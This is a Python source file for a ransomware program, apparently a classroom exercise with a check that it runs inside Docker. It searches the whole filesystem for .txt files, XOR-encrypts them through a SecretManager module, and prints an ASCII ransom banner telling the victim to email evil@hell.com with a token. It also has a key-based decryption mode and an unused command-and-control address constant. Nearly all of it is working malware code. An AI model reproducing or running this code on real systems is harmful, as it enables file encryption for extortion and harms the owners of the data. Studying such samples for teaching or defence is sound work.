import logging
import socket
import re
import sys
from pathlib import Path
from secret_manager import SecretManager


CNC_ADDRESS = "cnc:6666"
TOKEN_PATH = "/root/token"

ENCRYPT_MESSAGE = """
  _____                                                                                           
 |  __ \                                                                                          
 | |__) | __ ___ _ __   __ _ _ __ ___   _   _  ___  _   _ _ __   _ __ ___   ___  _ __   ___ _   _ 
 |  ___/ '__/ _ \ '_ \ / _` | '__/ _ \ | | | |/ _ \| | | | '__| | '_ ` _ \ / _ \| '_ \ / _ \ | | |
 | |   | | |  __/ |_) | (_| | | |  __/ | |_| | (_) | |_| | |    | | | | | | (_) | | | |  __/ |_| |
 |_|   |_|  \___| .__/ \__,_|_|  \___|  \__, |\___/ \__,_|_|    |_| |_| |_|\___/|_| |_|\___|\__, |
                | |                      __/ |                                               __/ |
                |_|                     |___/                                               |___/ 

Your txt files have been locked. Send an email to evil@hell.com with title '{token}' to unlock your data. 
"""
class Ransomware:
    def __init__(self) -> None:
        self.check_hostname_is_docker()
    
    def check_hostname_is_docker(self)->None:
        # At first, we check if we are in a docker
        # to prevent running this program outside of container
        hostname = socket.gethostname()
        result = re.match("[0-9a-f]{6,6}", hostname)
        if result is None:
            print(f"You must run the malware in docker ({hostname}) !")
            sys.exit(1)

    def get_files(self, filter:str)->list:
        # On utilise la méthode rglob de la classe Path pour récupérer tous les fichiers correspondant au filtre
        file_paths = Path('/').rglob(filter)
        # On crée une liste de chaînes de caractères contenant le chemin absolu de chaque fichier
        file_list = [str(file_path) for file_path in file_paths if file_path.is_file()]
        return file_list

    def encrypt(self):
        # List txt files
        files_to_encrypt = self.get_files('*.txt')
        if not files_to_encrypt:
            logging.info("No .txt files found.")
            return

        # Create SecretManager and call setup()
        secret_manager = SecretManager(TOKEN_PATH)
        secret_manager.setup()

        # Encrypt files
        secret_manager.xorfiles(files_to_encrypt)

        # Print message to victim
        hex_token = secret_manager.get_hex_token()
        print(ENCRYPT_MESSAGE.format(token=hex_token))

    def decrypt(self):
        # Create SecretManager and call setup()
        secret_manager = SecretManager(TOKEN_PATH)
        if not secret_manager.is_token_exist():
            print("No token found. Run the encryption process first.")
            return
        secret_manager.setup()

        # List encrypted files
        encrypted_files = self.get_files('*.txt.enc')
        if not encrypted_files:
            print("No encrypted files found.")
            return

        while True:
            # Ask for key
            key = input("Enter key to decrypt files: ")

            # Set key and decrypt files
            try:
                secret_manager.set_key(key)
                secret_manager.xorfiles(encrypted_files)
                secret_manager.clean()
                print("Files successfully decrypted.")
                return
            except ValueError:
                print("Wrong key. Please try again.")



if __name__ == "__main__":
    logging.basicConfig(level=logging.DEBUG)
    if len(sys.argv) < 2:
        ransomware = Ransomware()
        ransomware.encrypt()
    elif sys.argv[1] == "--decrypt":
        ransomware = Ransomware()
        ransomware.decrypt()